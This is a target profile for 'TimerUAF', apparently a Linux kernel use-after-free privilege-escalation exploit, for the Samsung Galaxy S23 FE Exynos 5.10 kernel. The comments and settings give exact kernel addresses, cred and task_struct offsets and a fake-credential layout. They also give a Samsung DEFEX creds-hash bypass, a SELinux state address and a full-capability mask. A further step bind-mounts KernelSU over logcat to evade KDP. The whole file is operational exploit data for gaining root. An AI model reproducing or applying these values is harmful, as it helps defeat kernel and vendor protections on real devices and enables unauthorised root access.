# TimerUAF kernel profile: Samsung Galaxy S23 FE (SM-S711B, Exynos, s23fe)
#
# Samsung mode profile, and the first member of a new kernel family: this is
# a 5.10 (android12) build, unlike every other documented profile, which is
# 5.15/6.x.  The 5.10 layout differences that show up in the constants:
#
#   - struct cred is 0xa8 with a 4-byte atomic usage -- same as 5.15 -- but
#     5.10 has no cred->ucounts field yet (group_info sits at +0x90 and the
#     non_rcu/rcu union at +0x98).  There is no init_ucounts symbol at all;
#     inc_ucount()/ucounts_lock/ucounts_hashtable exist but cred never
#     references a ucounts pointer.  The loader requires a ucounts write,
#     so cred_ucounts_off is pinned to 0x90, the same slot as the groups
#     write: the ucounts write happens first in code order and the groups
#     write (last) overwrites it.  init_ucounts is pointed at
#     ucounts_hashtable, which is therefore only ever written, never
#     dereferenced.
#   - task_struct is 0x1280 (fork_init literal; no vendor extension) with
#     task->cred at +0x780 (real_cred at +0x778).
#   - k_itimer is 0x108 with the timerqueue node at +0x78, unchanged from
#     5.15.
#
# Samsung endgame, same shape as the S23 / A15 profiles:
#
#   - Samsung DEFEX creds_fast_hash bypass (defex_creds_hash below)
#   - worker moves to u:r:init:s0 and bind-mounts the bundled diabl0w/KernelSU
#     ksud over /system/bin/logcat so KDP does not SIGKILL a direct exec
#   - ksud late-load pinned to the diabl0w/KernelSU manager package
#     (me.weishu.kernelsu, versionName samsung-v*), no manager discovery
#   - SELinux is left to ksud's own restore (no userspace re-enforce)
#
# Every constant is derived from the factory boot.img of
# s23fe_sm-s711b_exynos (AP S711BXXSJGZI6, Android 16 firmware, kernel
# 5.10.240-android12-9-33420454-abS711BXXSJGZI6, 4K pages, clang 12.0.4).
# The release is the full banner incl. the ab firmware suffix: a different
# ab suffix is a different kernel.  The sibling Snapdragon image in the same
# directory (s23fe_sm-s711u1_snapdragon) is a different build entirely and
# does not share these addresses.
#
#   5.10 init_posix_timers (__initstub__kmod_posix_timers__347_281):
#       kmem_cache_create_usercopy("posix_timers_cache", 0x108, ...)
#   do_timer_create:
#       ldr x0, [posix_timers_cache 0xffffffc00a1b6a50] via [x20,#0xa50];
#       bl kmem_cache_alloc at 0xffffffc0081a2dac -> return 0xffffffc0081a2db0
#   copy_process (bl at 0xffffffc0080d2c48) calls dup_task_struct, whose
#       bl kmem_cache_alloc(task_struct_cachep 0xffffffc00a16e188) returns to
#       0xffffffc0080d2c4c -> low21 0xd2c4c (5.10 has no kmem_cache_alloc_node
#       here either)
#   fork_init: kmem_cache_create_usercopy("task_struct", 0x1280, 64, ...);
#       arch_task_struct_size is absent, so task_alloc_bytes stays 0x1280
#   cred_init: kmem_cache_create_usercopy("cred_jar", 0xa8, ...,
#       SLAB_HWCACHE_ALIGN|PANIC|ACCOUNT) -> 4-byte usage, object 0xc0
#   cred layout from init_cred static data (0xffffffc009cf5020) +
#       prepare_creds/commit_creds disassembly: usage 0x0 (4 bytes),
#       uid 0x4, gid 0x8, suid 0xc, sgid 0x10, euid 0x14, egid 0x18,
#       fsuid 0x1c, fsgid 0x20, securebits 0x24, caps 0x28..0x48 (5 words),
#       keyring 0x58..0x70, security 0x78, user 0x80, user_ns 0x88,
#       group_info 0x90, non_rcu/rcu union 0x98, size 0xa8
#   get_task_creds: pid <= 0x8000 indexes creds_fast_hash directly as an
#       8-byte pointer array (cmp w25, #0x8, lsl #12); creds_fast_hash is its
#       own symbol at creds_hash + 0x40000 (creds_hash 0xffffffc00a3093b0)
#
# Vulnerability: fs/exec.c begin_new_exec() still calls posix_cpu_timers_exit()
# (0xffffffc0081a3db0) after exec_mmap (0xffffffc008387c78) and before
# exit_itimers (0xffffffc0081a1f14) -- the vulnerable order.  (begin_new_exec
# itself is at 0xffffffc0083872f4.)
#
# CONFIG (embedded IKCONFIG): ARM64_4K_PAGES=y, ARM64_VA_BITS=39,
# SECURITY_DEFEX=y, KDP=y, KDP_CRED=y, SLUB=y, SLUB_DEBUG=y, CFI_CLANG=y,
# SHADOW_CALL_STACK=y, MEMCG_KMEM=y, SECURITY_SELINUX=y.  No BTF.  SELinux is
# the first (and only) cred-blob LSM: __start_lsm_info..__end lists only
# capability, selinux, integrity, and the latter two have NULL blobs.
# DEFEX registers no cred blob.
release_prefix = "5.10.240-android12-9-33420454-abS711BXXSJGZI6"
schema_version = 1
ksu_kmi = "android12-5.10"

# Samsung endgame switches.
samsung_mode = 1
samsung_package = "me.weishu.kernelsu"
# creds_fast_hash: direct 8-byte pointer array indexed by pid.
defex_creds_hash = 0xffffffc00a3493b0

# 4K-page build.
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 5.10 frees the order-1 slab through the PCP lists (5.15-family prior;
# confirmed in QEMU below).
pcp_free = 1
alloc_req_off = 0x10

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) return address.
timer_site = 0xffffffc0081a2db0
timer_alloc = 0x108
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xa8, HWCACHE_ALIGN bytes_alloc=0xc0.
cred_req = 0xa8
cred_alloc = 0xc0
cred_size = 0xa8
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
# 5.10 cred has no ucounts field: pin the ucounts write onto the groups slot
# (see header).  init_ucounts below points at ucounts_hashtable.
cred_ucounts_off = 0x90
cred_group_off = 0x90
fake_cred_off = 0x18

# Link-time symbols (kallsyms).
selinux_state = 0xffffffc00a2c4e50
panic_on_warn = 0xffffffc009ed9dc0

# task_struct / cred layout (disassembly; this kernel has no BTF).
task_cred_off = 0x780
copy_process_low21 = 0xd2c4c
task_alloc_bytes = 0x1280

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc009f03960
init_user_ns = 0xffffffc009f03710
# Not a real init_ucounts (this kernel has none): ucounts_hashtable, only
# written into the overwritten slot, never dereferenced.
init_ucounts = 0xffffffc00a16efc8
init_groups = 0xffffffc009f04b90

# task_security_struct: SELinux is the first cred-blob LSM here.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
